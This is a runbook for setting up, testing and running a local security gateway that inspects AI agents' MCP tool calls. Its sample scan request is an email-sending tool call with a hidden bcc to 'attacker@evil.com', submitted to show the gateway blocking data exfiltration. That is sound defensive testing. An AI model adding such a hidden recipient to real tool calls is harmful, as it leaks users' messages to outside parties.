# MCP Security Gateway Monitor Runbook

This runbook distinguishes the two supported local services. They do **not** share an ingestion pipeline:

- **Real-time control plane (port 8000):** FastAPI dashboard and five-layer inspection endpoint at `POST /api/scan`.
- **Production API (port 8080):** stdlib HTTP service with its own four-detector monitor and `/v1/*` endpoints. Docker Compose runs this service.

The control-plane dashboard is external-traffic-only by default. Its optional workload is synthetic demonstration data and is visibly labelled `demo` in the UI.

## 1. Fresh Windows setup

Open PowerShell in the repository and use Python 3.10 or newer:

```powershell
py --version
py -m venv .venv
.\.venv\Scripts\Activate.ps1
py -m pip install --upgrade pip
py -m pip install -e ".[dev,server]"
```

If PowerShell blocks activation, use `Set-ExecutionPolicy -Scope Process Bypass`, or run each command with `.venv\Scripts\python.exe` instead of activating the environment.

## 2. Run the real-time control plane

```powershell
py -X utf8 run_realtime.py
```

Open <http://localhost:8000>. The process binds only to `127.0.0.1`, so it is accessible from this computer but is not exposed to the local network. API documentation is at <http://localhost:8000/docs>.

In a second PowerShell window, submit an external tool call:

```powershell
$call = @{
  name = 'email.send'
  server_id = 'postmark'
  arguments = @{ to = 'operator@example.com'; bcc = 'attacker@evil.com' }
} | ConvertTo-Json -Depth 4
Invoke-RestMethod -Method Post -Uri http://localhost:8000/api/scan `
  -ContentType 'application/json' -Body $call
Invoke-RestMethod -Uri http://localhost:8000/api/stats
```

The event should appear as `external`, stop at the blocking layer in the topology, and increment the source-aware statistics. The API response contains per-layer latency values; dashboard percentiles are calculated only from the bounded in-memory sample and are not a service-level objective.

### Optional local demonstration workload

Use this only for a presentation or visual check. It evaluates real payloads through the five-layer defense, but the traffic is generated locally and is not production traffic:

```powershell
$env:MCP_DEMO_MODE = '1'
py -X utf8 run_realtime.py
```

Every generated event is labelled `demo`. Close the terminal or press `Ctrl+C`, then remove the variable with `Remove-Item Env:MCP_DEMO_MODE` before the next external-traffic run.

## 3. Use the client middleware

Route an actual tool implementation through the port-8000 inspection endpoint:

```python
from mcp_monitor.client import GatewayClient, ToolBlocked

gateway = GatewayClient("http://localhost:8000")

@gateway.guard
def send_email(*, server_id: str, to: str, body: str) -> str:
    # Call the real MCP tool only after the gateway allows it.
    return "sent"

try:
    send_email(server_id="postmark", to="operator@example.com", body="status")
except ToolBlocked as error:
    print(error.verdict)
```

`GatewayClient` is fail-open on a transport error. If your deployment requires fail-closed behavior, enforce that policy in the surrounding agent wrapper and test the availability implications.

## 4. Run the production API (port 8080)

Create a local `.env` file from the safe template and set a non-placeholder API key:

```powershell
Copy-Item .env.example .env
notepad .env
$env:MCP_API_KEY = 'replace-with-a-long-random-value'
docker compose up --build
```

Check health:

```powershell
Invoke-RestMethod -Uri http://localhost:8080/v1/health
```

Port 8080 is also loopback-only in `docker-compose.yml`. The `locustfile.py` load test targets this production API, not the port-8000 dashboard:

```powershell
py -m pip install locust==2.31.8
locust -f locustfile.py --host=http://localhost:8080
```

Do not treat a Locust configuration target as a verified throughput result. Record hardware, worker count, error rate, percentile results, and server configuration with any published load-test claim.

## 5. Validation before a change or demo

```powershell
py -m ruff format --check src tests run_realtime.py
py -m ruff check src tests run_realtime.py
py -m pytest tests/test_5_layers.py tests/test_cross_platform.py tests/test_realtime.py -q --tb=short
py benchmark/tool_call_latency.py --iterations 200
```

The latency script prints measured local percentiles for the five-layer evaluator. It is a reproducible measurement aid, not evidence that a fixed latency target is met on every host.

For the complete suite:

```powershell
py -m pytest tests/ -q --tb=short
```

## 6. Troubleshooting

| Symptom | Check | Resolution |
|---|---|---|
| `ModuleNotFoundError: fastapi` | Server extra was not installed | Run `py -m pip install -e ".[dev,server]"`. |
| Browser cannot reach port 8000 | Server not started or port occupied | Run `Get-NetTCPConnection -LocalPort 8000`; stop the listed process, then restart `run_realtime.py`. |
| Dashboard says external traffic only and remains empty | This is the safe default | Send `POST /api/scan` traffic, or deliberately set `MCP_DEMO_MODE=1`. |
| Docker Compose exits before startup | `MCP_API_KEY` is missing | Set a non-placeholder value in the shell or `.env` file. |
| A Windows console cannot print text | Legacy code page | Start with `py -X utf8 run_realtime.py`; launcher messages are ASCII-only. |

## 7. Shutdown and evidence handling

Use `Ctrl+C` in the active server terminal. Do not commit generated `security_dashboard.html`, benchmark output, virtual environments, or API keys. Preserve production audit/WAL data according to your organization’s retention requirements; this repository does not define a compliance retention policy.
